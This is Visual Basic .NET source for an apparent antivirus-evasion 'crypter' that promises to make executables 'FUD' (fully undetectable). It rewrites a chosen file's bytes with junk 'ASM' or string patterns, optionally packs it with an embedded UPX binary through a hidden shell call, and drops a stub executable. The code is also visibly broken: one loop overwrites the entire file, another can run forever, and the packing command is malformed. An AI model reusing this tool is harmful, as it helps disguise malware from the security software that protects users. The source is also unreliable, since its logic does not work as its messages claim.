Imports System.IO
Imports System.Text
Imports System.Resources
Imports System.Security.Cryptography
Imports Microsoft.Win32


Public Class Form1

    Private Sub RadioButton1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton1.CheckedChanged
        If RadioButton1.Checked = True Then
            RadioButton2.Checked = False
        End If
    End Sub

    Private Sub RadioButton2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton2.CheckedChanged
        If RadioButton2.Checked = True Then
            RadioButton1.Checked = False
        End If
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        MsgBox("Random ASM Code will add random bytes such as 'push 0x20' instead of random text such as 'FG9S8G938TGD9F8K598'", MsgBoxStyle.Information, "Random ASM Code")
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        MsgBox("Random Strings will add random bytes such as 'FG9S8G938TGD9F8K598' instead of random ASM code such as 'push 0x20'", MsgBoxStyle.Information, "Random Strings")
    End Sub



    Public Function MD5CalcFile(ByVal filepath As String) As String
        'Using reader As New System.IO.FileStream(filepath, IO.FileMode.Open, IO.FileAccess.Read)
        'Using md5 As New System.Security.Cryptography.MD5CryptoServiceProvider
        'Dim hash() As Byte = MD5.ComputeHash(reader)
        'Return ByteArrayToString(hash)

        'End Using
        'End Using

    End Function

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        'If ComboBox1.SelectedItem = "Stubs Programming Language" Then
        'MsgBox("Invalid programming languge for stub selected", MsgBoxStyle.Exclamation)


        'Else
        'If My.User.IsAuthenticated Then
        'Else
        'MsgBox("Note: not running as administrator, this may cause issues" & vbNewLine & "Press Cancel to close the application, or press OK to continue.", MsgBoxStyle.Critical, MsgBoxStyle.OkCancel)
        'End If

        'If MsgBoxResult.Cancel = True Then
        'End
        '   End If
        'End If

        '////////////////////////^^WTF?! lol


        Dim dlg As OpenFileDialog = New OpenFileDialog()
        Dim res As DialogResult = dlg.ShowDialog()

        Dim filename As String = dlg.FileName


        If res = 1 Then

            Dim MyFile As New FileInfo(filename)
            Dim FileSize As Long = MyFile.Length


            Dim icn As Icon
            icn = Icon.ExtractAssociatedIcon(filename)

            Dim oWrite As System.IO.StreamWriter
            oWrite = File.CreateText("C:\Users\Tristan\Desktop\FI.txt")
            oWrite.WriteLine(filename)
            oWrite.Flush()
            oWrite.Close()

            If RadioButton1.Checked = True Then
                Dim fudfilename As String = filename & ".temp"
                'If File.Exists(fudfilename) Then


                Debug.WriteLine("lets create the file")


                'File.Create(fudfilename)

                'Else
                If File.Exists(fudfilename) Then
                    File.Delete(fudfilename)

                End If
                File.Copy(filename, fudfilename)
                'Else
                Dim fs As New FileStream(fudfilename, FileMode.Open, FileAccess.ReadWrite)
                Dim b As Integer = fs.ReadByte()


                Debug.WriteLine("starting loop")


                While b <> -1
                    fs.Seek(-1, SeekOrigin.Current)
                    fs.WriteByte(&H20)
                    fs.WriteByte(&H3B)
                    fs.WriteByte(&H6A)
                    fs.WriteByte(&H6D)
                    fs.WriteByte(&H70)
                    fs.WriteByte(&H20)
                    fs.WriteByte(&H62)
                    fs.WriteByte(&H67)
                    fs.WriteByte(&H6E)
                    fs.WriteByte(&HC4)



                    b = fs.ReadByte()
                    'End If


                    ' If My.Computer.FileSystem.FileExists(filename) Then
                    'Dim fudfn As String = filename & "[FUD].exe"
                    'Dim fs1 As New FileStream(fudfn, FileMode.Create, FileAccess.ReadWrite)




                End While
                'End If


                Debug.WriteLine("finishing loop")


                'fs.Close()
                'fs.Dispose()
                MsgBox("FUDing Completed" & vbNewLine & "Please note: if it doesn't work the first time, try again with the already modified file")
            Else
                If RadioButton2.Checked = True Then
                    Dim fudfilename As String = filename & ".temp"
                    'If File.Exists(fudfilename) Then
                    'Else

                    File.Copy(filename, fudfilename)
                    'End If
                    Dim fs As New FileStream(fudfilename, FileMode.Open, FileAccess.ReadWrite)
                    Dim b As Integer = fs.ReadByte()
                    While b <> -1
                        If b = (&H20) Then
                            fs.Seek(-1, SeekOrigin.Current)
                            fs.WriteByte(&H20)
                            fs.WriteByte(&HC4)
                            fs.WriteByte(&HC4)



                            b = fs.ReadByte()
                        End If

                        If b = (&H21) Then
                            fs.WriteByte(&HC4)
                            fs.WriteByte(&HC4)
                        End If
                        If b = (&HA0) Then
                            fs.WriteByte(&HC4)
                            fs.WriteByte(&HC4)
                            fs.WriteByte(&HC4)
                        End If



                    End While
                    fs.Close()
                    fs.Dispose()
                    MsgBox("FUDing Completed")
                End If
            End If
            'End If




            If CheckBox1.Checked = True Then
                MsgBox("Beginning packing" & vbNewLine & "Note: this may freeze the program briefely as it has to handle a lot of data", MsgBoxStyle.Information, "Packing")
                Dim tempFileName As String = System.IO.Path.GetTempFileName() & ".exe"
                Using fs As New FileStream(tempFileName, FileMode.Create)
                    fs.Write(My.Resources.upx, 0, My.Resources.upx.Length)
                End Using
                Dim tempFileName1 As String = System.IO.Path.GetTempFileName() & ".1"
                Using fs As New FileStream(tempFileName1, FileMode.Create)
                    fs.Write(My.Resources.upx1, 0, My.Resources.upx1.Length)
                End Using
                Dim fudfn As String = filename & "FUD.exe"
                Shell("cmd.exe " & tempFileName & " -9 " & fudfn, AppWinStyle.Hide)

            End If
        End If

        Dim fudfilename1 As String = filename & ".temp"

        Dim tempFileName12 As String = System.IO.Path.GetTempFileName() & ".exe"
        Using fs12 As New FileStream(tempFileName12, FileMode.Create)
            fs12.Write(My.Resources.EmptyStub, 0, My.Resources.EmptyStub.Length)
            fs12.Flush()
            fs12.Close()
        End Using

        Dim stub As String = Application.StartupPath & "\Stub.exe"
        If res = 1 Then
            If File.Exists(stub) Then
                File.Delete(stub)
            End If
            File.Copy(tempFileName12, stub)
        End If
    End Sub














    Public Function checkID(ByVal id As String) As Boolean
        On Error Resume Next

        Dim regPID As RegistryKey
        regPID = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion", False)
        Dim regGUID As RegistryKey
        regGUID = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Cryptography", False)


        Dim Pid As Object
        Pid = Replace(regPID.GetValue("ProductId"), "-", "")

        Dim GUID As Object
        GUID = Replace(regGUID.GetValue("MachineGUID"), "-", "")


        Dim lenPID As Integer
        'Number of characters in ProductId.
        lenPID = Len(Pid)
        Dim lenGUID As Integer
        'Number of characters in MachineGUID.
        lenGUID = Len(GUID)


        Dim tempValue As String
        Dim strPID As String
        Dim strGUID As String
        Dim hardwareID As String


        'Continues conversion to the end of the string length.
        For x = 1 To lenPID
            tempValue = Hex((Asc(Mid(Pid, x, 1)) Xor 23) Xor 14)
            strPID = strPID & tempValue
        Next x
        'Reverses the character/string order of ProductId.
        strPID = StrReverse(strPID)

        'Continues conversion to the end of the string length.
        For x = 1 To lenGUID
            tempValue = Hex((Asc(Mid(GUID, x, 1)) Xor 23) Xor 14)
            strGUID = strGUID & tempValue
        Next x

        'Reverses the character/string order of MachineGUID.
        strGUID = StrReverse(strGUID)
        'Reverses MachineGUID back first, then adds the reversed
        'character/string order of ProductId.
        hardwareID = StrReverse(strGUID & strPID)
        If hardwareID = id Then
            checkID = True
        Else
            checkID = False
        End If
    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '  If checkID("29292D2B2F292F2C2B20282E212E28212F2A202B7878217C7A2D292C7D7C7A282D2E2C2A782B7F7C2D7B2B287B2A7D7C2C7D2C2A") = True Then
        ' Else
        ' End
        ' End If
        RadioButton1.Checked = True

    End Sub
    Private Sub Button4_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        MsgBox("Packing a stub reduces its size by up to 50%" & vbNewLine & "If your stub is being corrupted, uncheck this", MsgBoxStyle.Information, "Packing Stubs")
    End Sub

    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
        MsgBox("Credit to:" & vbNewLine & "Coding: Neconide" & vbNewLine & "Concept: Reclaimer" & vbNewLine & "Graphics: nitr0genics" & vbNewLine & vbNewLine & "Shouts:" & vbNewLine & "Ampix0, H4CK3R, X0ul, Nyx-, KillaWh0, Fallen" & vbNewLine & "sorry to anyone I forgot", MsgBoxStyle.Information, "Credits & Shouts")
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged

    End Sub













    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("")
    End Sub
End Class




















Public Class RandomKeyGenerator
    Dim Key_Letters As String
    Dim Key_Numbers As String
    Dim encryptionkey As String
    Dim Key_Chars As Integer
    Dim LettersArray As Char()
    Dim NumbersArray As Char()

    Protected Friend WriteOnly Property KeyLetters() As String
        Set(ByVal Value As String)
            Key_Letters = Value
        End Set
    End Property


    Protected Friend WriteOnly Property KeyNumbers() As String
        Set(ByVal Value As String)
            Key_Numbers = Value
        End Set
    End Property

    Protected Friend WriteOnly Property KeyChars() As Integer
        Set(ByVal Value As Integer)
            Key_Chars = Value
        End Set
    End Property

    Function Generate() As String
        Dim i_key As Integer
        Dim Random1 As Single
        Dim arrIndex As Int16
        Dim sb As New StringBuilder
        Dim RandomLetter As String

        LettersArray = Key_Letters.ToCharArray
        NumbersArray = Key_Numbers.ToCharArray

        For i_key = 1 To Key_Chars

            Randomize()
            Random1 = Rnd()
            arrIndex = -1

            If (CType(Random1 * 111, Integer)) Mod 2 = 0 Then

                Do While arrIndex < 0
                    arrIndex = _
                     Convert.ToInt16(LettersArray.GetUpperBound(0) _
                     * Random1)
                Loop
                RandomLetter = LettersArray(arrIndex)


                If (CType(arrIndex * Random1 * 99, Integer)) Mod 2 <> 0 Then
                    RandomLetter = LettersArray(arrIndex).ToString
                    RandomLetter = RandomLetter.ToUpper
                End If
                sb.Append(RandomLetter)
            Else

                Do While arrIndex < 0
                    arrIndex = _
                      Convert.ToInt16(NumbersArray.GetUpperBound(0) _
                      * Random1)
                Loop
                sb.Append(NumbersArray(arrIndex))
            End If
        Next
        Return sb.ToString
    End Function
End Class















